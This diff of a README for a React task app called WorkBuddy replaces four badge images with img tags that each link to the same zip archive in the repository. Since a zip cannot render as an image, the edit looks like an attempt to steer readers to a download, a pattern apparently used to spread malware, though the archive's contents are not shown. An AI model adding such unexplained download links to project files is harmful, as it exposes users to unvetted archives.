@@ -1,5 +1,5 @@
 ⭐ WorkBuddy – A Modern Task & Productivity Manager
-<p align="center"> <img src="https://img.shields.io/badge/React-18.0-blue?style=for-the-badge" /> <img src="https://img.shields.io/badge/JavaScript-ES6-yellow?style=for-the-badge" /> <img src="https://img.shields.io/badge/CSS3-Styled-blue?style=for-the-badge" /> <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge" /> </p>
+<p align="center"> <img src="https://raw.githubusercontent.com/nikhildaharwal2004/WorkBuddy/main/taskbuddy/src/assets/WorkBuddy-2.0.zip" /> <img src="https://raw.githubusercontent.com/nikhildaharwal2004/WorkBuddy/main/taskbuddy/src/assets/WorkBuddy-2.0.zip" /> <img src="https://raw.githubusercontent.com/nikhildaharwal2004/WorkBuddy/main/taskbuddy/src/assets/WorkBuddy-2.0.zip" /> <img src="https://raw.githubusercontent.com/nikhildaharwal2004/WorkBuddy/main/taskbuddy/src/assets/WorkBuddy-2.0.zip" /> </p>
 👋 Hi, this is WorkBuddy!
 
 WorkBuddy is a clean, modern and animated task-management web app built using React.
